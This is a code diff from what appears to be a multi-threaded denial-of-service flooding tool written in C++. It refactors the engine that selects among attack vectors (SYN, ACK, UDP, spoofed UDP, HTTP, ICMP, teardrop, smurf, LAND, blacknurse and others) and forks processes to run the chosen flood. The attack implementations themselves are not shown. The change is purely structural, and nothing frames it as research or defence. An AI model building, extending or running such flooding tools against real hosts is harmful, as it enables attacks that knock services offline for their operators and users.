@@ -4,50 +4,48 @@
 #include <memory>
 #include <unistd.h>
 
-#include <spdlog/spdlog.h>
-
-engine::engine(std::shared_ptr<Config> config) {
-  std::unique_ptr<Vector> flood{[&]() -> Vector * {
-    switch (config->vec) {
+engine::engine() {
+  std::unique_ptr<IVector> flood{[&]() -> IVector * {
+    switch (Config::get().vec) {
     case TCP_FLOOD:
-      return new tcp_flood(config);
+      return new tcp_flood();
     case UDP_FLOOD:
-      return new udp_flood(config);
+      return new udp_flood();
     case NULL_TCP:
-      return new null_tcp(config);
+      return new null_tcp();
     case NULL_UDP:
-      return new null_udp(config);
+      return new null_udp();
     case HTTP_FLOOD:
-      return new http_flood(config);
+      return new http_flood();
     case ICMP_FLOOD:
-      return new icmp_flood(config);
+      return new icmp_flood();
     case SYN_FLOOD:
-      return new syn_flood(config);
+      return new syn_flood();
     case ACK_FLOOD:
-      return new ack_flood(config);
+      return new ack_flood();
     case FIN_FLOOD:
-      return new fin_flood(config);
+      return new fin_flood();
     case SPOOFED_UDP_FLOOD:
-      return new spoofed_udp_flood(config);
+      return new spoofed_udp_flood();
     case TEARDROP:
-      return new teardrop(config);
+      return new teardrop();
     case BLACKNURSE:
-      return new blacknurse(config);
+      return new blacknurse();
     case LAND:
-      return new land(config);
+      return new land();
     case SMURF:
-      return new smurf(config);
+      return new smurf();
     case ACK_PSH_FLOOD:
-      return new ack_psh_flood(config);
+      return new ack_psh_flood();
     case RST_FLOOD:
-      return new rst_flood(config);
+      return new rst_flood();
     default:
       spdlog::get("logger")->error("invalid Vector selected");
       exit(EXIT_FAILURE);
     }
   }()};
 
-  for (int i = 0; i < config->trds; ++i) {
+  for (int i = 0; i < Config::get().trds; ++i) {
     if (fork())
       flood->run();
   }
